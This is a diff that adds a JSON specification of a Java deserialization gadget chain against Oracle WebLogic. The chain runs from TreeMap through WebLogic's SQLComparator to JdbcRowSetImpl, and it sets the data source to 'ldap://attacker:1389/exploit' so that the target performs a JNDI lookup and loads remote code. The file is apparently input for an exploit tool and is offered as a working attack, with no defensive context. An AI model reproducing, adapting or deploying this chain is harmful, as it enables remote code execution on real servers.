@@ -1,0 +1,20 @@
+{
+  "chain_type": "Post-PSU: TreeMap → SQLComparator → Map objects (probe Map interface exploitation)",
+  "root_class": "java.util.TreeMap",
+  "root_trigger": "readObject→buildFromSorted→comparator.compare",
+  "links": [
+    {
+      "class": "weblogic.jdbc.rowset.SQLComparator",
+      "field_overrides": {
+        "cols": ["dataSource", "url"]
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker:1389/exploit"
+      }
+    }
+  ],
+  "sink_method": "SQLComparator.compare→Map.get→JNDI"
+}
